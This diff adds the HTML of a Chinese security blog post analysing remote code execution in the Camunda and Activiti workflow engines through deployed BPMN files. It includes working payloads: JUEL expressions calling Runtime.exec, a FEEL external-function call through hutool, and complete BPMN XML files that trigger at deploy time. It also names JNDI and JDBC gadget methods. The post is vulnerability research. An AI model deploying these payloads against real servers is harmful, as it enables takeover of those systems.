@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="背景工作中有碰到 activiti 和 camunda 两个工作流相关的组件，一般用于流程编排等，这些组件一般允许自定义表达式和脚本等用于工作流的定义和条件判断，在内部是通过 bpmn 文件表示，因此提供了代码执行的能力，网上也有看到相关文章介绍对应的漏洞，根据触发时间不同，分为部署流程时触发和运行时触发。所以这里分别介绍一下 camunda 和 activiti 如何通过 deploy bpmn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="workflow 相关组件漏洞">
+<meta property="og:url" content="http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/">
+<meta property="og:site_name" content="wude">
+<meta property="og:description" content="背景工作中有碰到 activiti 和 camunda 两个工作流相关的组件，一般用于流程编排等，这些组件一般允许自定义表达式和脚本等用于工作流的定义和条件判断，在内部是通过 bpmn 文件表示，因此提供了代码执行的能力，网上也有看到相关文章介绍对应的漏洞，根据触发时间不同，分为部署流程时触发和运行时触发。所以这里分别介绍一下 camunda 和 activiti 如何通过 deploy bpmn">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-04-22T02:19:57.000Z">
+<meta property="article:modified_time" content="2025-04-22T06:28:54.685Z">
+<meta property="article:author" content="wude">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>workflow 相关组件漏洞</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&text=workflow 相关组件漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&title=workflow 相关组件漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&is_video=false&description=workflow 相关组件漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=workflow 相关组件漏洞&body=Check out this article: http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&title=workflow 相关组件漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&title=workflow 相关组件漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&title=workflow 相关组件漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&title=workflow 相关组件漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&name=workflow 相关组件漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&t=workflow 相关组件漏洞"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#camunda"><span class="toc-number">2.</span> <span class="toc-text">camunda</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#activiti"><span class="toc-number">3.</span> <span class="toc-text">activiti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reference"><span class="toc-number">4.</span> <span class="toc-text">reference</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        workflow 相关组件漏洞
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wude</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-22T02:19:57.000Z" class="dt-published" itemprop="datePublished">2025-04-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>工作中有碰到 activiti 和 camunda 两个工作流相关的组件，一般用于流程编排等，这些组件一般允许自定义表达式和脚本等用于工作流的定义和条件判断，在内部是通过 bpmn 文件表示，因此提供了代码执行的能力，网上也有看到相关文章介绍对应的漏洞，根据触发时间不同，分为部署流程时触发和运行时触发。所以这里分别介绍一下 camunda 和 activiti 如何通过 deploy bpmn 文件实现漏洞利用。</p>
+<h2 id="camunda"><a href="#camunda" class="headerlink" title="camunda"></a>camunda</h2><p>官方文档：<a target="_blank" rel="noopener" href="https://docs.camunda.org/get-started/%E3%80%82%E8%AF%A5%E6%96%87%E6%A1%A3%E6%98%AF%E5%AE%98%E6%96%B9">https://docs.camunda.org/get-started/。该文档是官方</a> demo 文档，可以使用 docker 完成服务端配置，默认账号密码：demo&#x2F;demo，其余操作可以使用 api。api 文档：<a target="_blank" rel="noopener" href="https://docs.camunda.org/rest/camunda-bpm-platform/7.23-SNAPSHOT/#tag/Deployment/operation/createDeployment">https://docs.camunda.org/rest/camunda-bpm-platform/7.23-SNAPSHOT/#tag/Deployment/operation/createDeployment</a></p>
+<p>实测 docker 启动下，部署流程的 api 为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/camunda/api/engine/engine/default/deployment/create</span><br></pre></td></tr></table></figure>
+
+<p>其余 api 也可对应。</p>
+<p>有趣的是，官方文档在这个 api 特意标注了安全风险：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Security Consideration</span><br><span class="line"></span><br><span class="line">Deployments can contain custom code in form of scripts or EL expressions to customize process behavior. This may be abused for remote execution of arbitrary code.</span><br></pre></td></tr></table></figure>
+<p>通过在 api 文档中搜索 <code>security consideration</code> 关键字，发现不止 deploy 和 redeploy 会有安全风险，还可以在查询流程时指定表达式。比如 &#x2F;task 接口。</p>
+<p>当然官方文档说默认禁用，不知道不同版本间有无区别，可能有些低版本是默认开启的。参考文档：<a target="_blank" rel="noopener" href="https://docs.camunda.org/manual/develop/user-guide/process-engine/securing-custom-code/">https://docs.camunda.org/manual/develop/user-guide/process-engine/securing-custom-code/</a></p>
+<p>漏洞利用有 script 和 expression 两种。script 分为 groovy，python，ruby。expression 分为 juel 和 feel。</p>
+<p>本地实测 7.22.0 版本的时候，使用正常的 juel 无法执行，报错有 graalvm 字眼。遂用之前写过的表达式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;&quot;</span>.getClass()).invoke(<span class="string">&quot;&quot;</span>.class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>),<span class="string">&quot;touch /tmp/pwned&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+<p>官方 expression 文档：</p>
+<p><a target="_blank" rel="noopener" href="https://docs.camunda.org/manual/latest/user-guide/process-engine/expression-language/">https://docs.camunda.org/manual/latest/user-guide/process-engine/expression-language/</a></p>
+<p><a target="_blank" rel="noopener" href="https://docs.camunda.org/manual/latest/user-guide/dmn-engine/expressions-and-scripts/">https://docs.camunda.org/manual/latest/user-guide/dmn-engine/expressions-and-scripts/</a></p>
+<p>从文档得知，使用的 juel 为自己实现的，参考 Jakarta Expression Language 4.0 standard 标准。</p>
+<p>至于 feel，相关资料并不多，只有官方文档，一时间以为不存在利用方式，最后还是找到了，所以下面介绍一下 feel 脚本语言及利用方式。</p>
+<p>在官方文档(<a target="_blank" rel="noopener" href="https://camunda.github.io/feel-scala/docs/developer-guide/bootstrapping)%E4%B8%AD%E6%9C%89%E6%8F%90%E5%88%B0%E4%B8%80%E4%B8%AA">https://camunda.github.io/feel-scala/docs/developer-guide/bootstrapping)中有提到一个</a> <code>security</code> 项：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">External functions are disabled by default. They would allow calling arbitrary code or accessing sensitive data. It is recommended to use the FunctionProvider API instead.</span><br></pre></td></tr></table></figure>
+<p>还提到了如何开启这个 external function：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">FeelEngine</span>.Builder().enableExternalFunctions(<span class="literal">true</span>).build()</span><br></pre></td></tr></table></figure>
+
+<p>用关键字去源码搜了一下，在 test 类中搜到了相关用法：</p>
+<figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- <span class="type">ExternalFunctionsConfigurationTest</span>.scala</span><br><span class="line"><span class="keyword">val</span> externalFunctionInvocation =</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&#123;</span></span><br><span class="line"><span class="string">        f: function(x) external &#123; java: &#123; class: &quot;java.lang.Math&quot;, method signature: &quot;abs(long)&quot; &#125; &#125;,</span></span><br><span class="line"><span class="string">        call: f(-1)</span></span><br><span class="line"><span class="string">        &#125;.call&quot;&quot;&quot;</span></span><br><span class="line">engineWithEnabledFunctions.parseExpression(externalFunctionInvocation)   </span><br></pre></td></tr></table></figure>
+<p>所以以此也可以自己写代码验证。</p>
+<p>根据关键字搜索了一下，应该是使用反射调用对应方法，相关 scala 代码如下：</p>
+<figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">invokeJavaFunction</span></span>(</span><br><span class="line">      className: <span class="type">String</span>,</span><br><span class="line">      methodName: <span class="type">String</span>,</span><br><span class="line">      arguments: <span class="type">List</span>[<span class="type">String</span>],</span><br><span class="line">      paramValues: <span class="type">List</span>[<span class="type">Val</span>],</span><br><span class="line">      valueMapper: <span class="type">ValueMapper</span></span><br><span class="line">  )(<span class="keyword">implicit</span> context: <span class="type">EvalContext</span>): <span class="type">Val</span> = &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">val</span> clazz = <span class="type">JavaClassMapper</span>.loadClass(className)</span><br><span class="line">      <span class="keyword">val</span> argTypes = arguments map <span class="type">JavaClassMapper</span>.loadClass</span><br><span class="line">      <span class="keyword">val</span> method = clazz.getDeclaredMethod(methodName, argTypes: _*)</span><br><span class="line">      <span class="keyword">val</span> argJavaObjects = paramValues zip argTypes map &#123; <span class="keyword">case</span> (obj, clazz) =&gt;</span><br><span class="line">        <span class="type">JavaClassMapper</span>.asJavaObject(obj, clazz)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">val</span> result = method.invoke(<span class="literal">null</span>, argJavaObjects: _*)</span><br><span class="line">      valueMapper.toVal(result)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>让 deepseek 帮我翻译成 java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Val <span class="title function_">invokeJavaFunction</span><span class="params">(</span></span><br><span class="line"><span class="params">        String className,</span></span><br><span class="line"><span class="params">        String methodName,</span></span><br><span class="line"><span class="params">        List&lt;String&gt; arguments,</span></span><br><span class="line"><span class="params">        List&lt;Val&gt; paramValues,</span></span><br><span class="line"><span class="params">        ValueMapper valueMapper,</span></span><br><span class="line"><span class="params">        EvalContext context)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = JavaClassMapper.loadClass(className);</span><br><span class="line">        </span><br><span class="line">        Class&lt;?&gt;[] argTypes = arguments.stream().map(JavaClassMapper::loadClass).toArray(Class&lt;?&gt;[]::<span class="keyword">new</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(methodName, argTypes);</span><br><span class="line">        Object[] argJavaObjects = IntStream.range(<span class="number">0</span>, paramValues.size())</span><br><span class="line">                .mapToObj(i -&gt; JavaClassMapper.asJavaObject(paramValues.get(i), argTypes[i])).toArray();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(<span class="literal">null</span>, argJavaObjects);</span><br><span class="line">        <span class="keyword">return</span> valueMapper.toVal(result);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>很明显看出是调用类的静态方法。</p>
+<p>意味着只能调用 public 和 static，且参数只能为 String 的，因为试了别的参数类型不行，包括 String[] 也不行。</p>
+<p>最终结合出网和不出网大概得到几种利用方式：</p>
+<p>java.sql.DriverManager.getConnection(String)</p>
+<p>cn.hutool.script.ScriptUtil.eval(String)</p>
+<p>javax.naming.InitialContext.doLookup(String)</p>
+<p>以第二种 hutool 依赖为例，poc 如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FeelEngine</span> <span class="variable">engine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FeelEngine</span>.Builder().enableExternalFunctions(<span class="literal">true</span>).build();</span><br><span class="line">Map&lt;String, Object&gt; variables = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">String</span> <span class="variable">expression3</span> <span class="operator">=</span> <span class="string">&quot;&#123;f: function(x) external &#123; java: &#123; class: \&quot;cn.hutool.script.ScriptUtil\&quot;, method signature: \&quot;eval(String)\&quot; &#125;&#125;, call: f(\&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)\&quot;) &#125;.call&quot;</span>;</span><br><span class="line">engine.evalExpression(expression, variables);</span><br></pre></td></tr></table></figure>
+
+<p>如果只有 spring 且不能出网，可以参考 p神 的利用：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-network.html">https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-network.html</a></p>
+<p>回到漏洞利用，参考：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/3823">https://forum.butian.net/share/3823</a> 可知，bpmn 文件支持时间相关定义使用表达式，且时间相关标签会在部署之后即解析执行表达式，这样是为了确定流程执行间隔时间等，比如 timeDuration 标签，其他标签可以参考 <a target="_blank" rel="noopener" href="https://www.omg.org/spec/BPMN/2.0.2/PDF%E3%80%82">https://www.omg.org/spec/BPMN/2.0.2/PDF。</a></p>
+<p>参考 flowable 的解析执行流程，camunda 的过程也差不多，从 deploy 到执行 timeDuration 表达式调用栈如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">AbstractDefinitionDeployer.deploy</span><br><span class="line">- AbstractDefinitionDeployer.parseDefinitionResources</span><br><span class="line"> - AbstractDefinitionDeployer.transformResource</span><br><span class="line">  - BpmnDeployer.transformDefinitions</span><br><span class="line">   - BpmnParse.execute</span><br><span class="line">    - BpmnParse.parseRootElement</span><br><span class="line">     - BpmnParse.parseProcessDefinitions</span><br><span class="line">      - BpmnParse.parseProcess</span><br><span class="line">       - BpmnParse.parseScope</span><br><span class="line">        - BpmnParse.parseStartEvents</span><br><span class="line">         - BpmnParse.parseProcessDefinitionStartEvent</span><br><span class="line">          - BpmnParse.parseTimerStartEventDefinition</span><br><span class="line">           - BpmnParse.parseTimer</span><br><span class="line">            - BpmnParse.parseExpression</span><br><span class="line">             - expressionManager.createExpression(expressionText)</span><br><span class="line">- AbstractDefinitionDeployer.postProcessDefinitions</span><br><span class="line"> - AbstractDefinitionDeployer.persistDefinitions</span><br><span class="line">  - AbstractDefinitionDeployer.registerDefinition</span><br><span class="line">   - BpmnDeployer.definitionAddedToDeploymentCache</span><br><span class="line">    - BpmnDeployer.adjustStartEventSubscriptions</span><br><span class="line">     - BpmnDeployer.addTimerDeclarations</span><br><span class="line">      - TimerDeclarationImpl.createStartTimerInstance</span><br><span class="line">       - TimerDeclarationImpl.createTimer</span><br><span class="line">        - JobDeclaration.createJobInstance</span><br><span class="line">         - TimerDeclarationImpl.postInitialize</span><br><span class="line">          - TimerDeclarationImpl.initializeConfiguration</span><br><span class="line">           - TimerDeclarationImpl.resolveAndSetDuedate</span><br><span class="line">            - description.getValue(scopeForExpression) // sink</span><br></pre></td></tr></table></figure>
+
+<p>使用版本为 camunda-7.17.0。</p>
+<p>完整 bpmn xml 文件如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">definitions</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.omg.org/spec/BPMN/20100524/MODEL&quot;</span> <span class="attr">xmlns:camunda</span>=<span class="string">&quot;http://camunda.org/schema/1.0/bpmn&quot;</span> <span class="attr">targetNamespace</span>=<span class="string">&quot;http://www.omg.org/spec/BPMN/20100524/MODEL&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">process</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span> <span class="attr">isExecutable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">camunda:historyTimeToLive</span>=<span class="string">&quot;45&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">startEvent</span> <span class="attr">id</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">timerEventDefinition</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">timeDuration</span>&gt;</span> </span><br><span class="line">		  $&#123;&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, &quot;&quot;.getClass()).invoke(&quot;&quot;.class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;touch /tmp/pwned&quot;)&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">timeDuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">timerEventDefinition</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">startEvent</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">process</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">definitions</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="activiti"><a href="#activiti" class="headerlink" title="activiti"></a>activiti</h2><p>activiti 和 camunda 差不多，都可以利用比如 timeDuration 标签执行表达式，这是 bpmn 的规范，按理说都应该会支持，所以直接看 activiti 从 deploy 到执行的调用栈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">BpmnDeployer.deploy</span><br><span class="line">- BpmnParse.execute</span><br><span class="line"> - BpmnParse.transformProcessDefinitions</span><br><span class="line">  - BpmnParseHandlers.parseElement</span><br><span class="line">   - BpmnParseHandler.parse</span><br><span class="line">    - AbstractBpmnParseHandler.parse</span><br><span class="line">     - AbstractBpmnParseHandler.executeParse</span><br><span class="line">      - TimerEventDefinitionParseHandler.executeParse</span><br><span class="line">       - TimerEventDefinitionParseHandler.createTimer</span><br><span class="line">        - ExpressionManager.createExpression</span><br><span class="line">- BpmnDeployer.addTimerDeclarations</span><br><span class="line"> - TimerDeclarationImpl.prepareTimerEntity</span><br><span class="line">  - description.getValue(scopeForExpression) // sink</span><br></pre></td></tr></table></figure>
+
+<p>使用版本为 activiti-5.20。</p>
+<p>poc：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">definitions</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.omg.org/spec/BPMN/20100524/MODEL&quot;</span> <span class="attr">targetNamespace</span>=<span class="string">&quot;http://www.activiti.org/test&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">process</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span> <span class="attr">isExecutable</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">startEvent</span> <span class="attr">id</span>=<span class="string">&quot;startEvent&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">timerEventDefinition</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">timeDuration</span>&gt;</span></span><br><span class="line">          $&#123;&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, &quot;&quot;.getClass()).invoke(&quot;&quot;.class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;touch /tmp/pwned&quot;)&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">timeDuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">timerEventDefinition</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">startEvent</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">process</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 